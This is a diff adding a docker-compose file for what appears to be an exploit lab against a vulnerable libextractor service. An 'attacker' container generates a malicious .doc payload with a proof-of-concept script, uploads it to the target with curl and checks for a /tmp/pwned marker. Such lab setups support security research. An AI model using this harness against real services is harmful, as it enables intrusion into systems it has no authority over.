@@ -1,0 +1,38 @@
+version: "3.8"
+
+services:
+  target:
+    build:
+      context: ..
+      dockerfile: lab-setup/Dockerfile
+    container_name: libextractor-vulnerable
+    ports:
+      - "8080:8080"
+    # Container default stack is often limited
+    ulimits:
+      stack:
+        soft: 2097152   # 2MB - realistic for containers
+        hard: 4194304   # 4MB
+
+  attacker:
+    image: python:3.11-slim
+    container_name: libextractor-attacker
+    depends_on:
+      - target
+    volumes:
+      - ../poc:/poc
+      - ../exploit:/exploit
+    command: >
+      bash -c "
+        apt-get update -qq && apt-get install -y curl -qq;
+        pip install requests -q;
+        sleep 3;
+        echo '[*] Generating payload...';
+        python3 /poc/gen_payload.py /tmp/exploit.doc 3.9;
+        echo '[*] Sending to target...';
+        curl -s -F document=@/tmp/exploit.doc http://target:8080/upload;
+        echo '';
+        echo '[*] Checking /tmp/pwned on target...';
+        sleep 2;
+        echo 'Done. Run: docker exec libextractor-vulnerable cat /tmp/pwned';
+      "
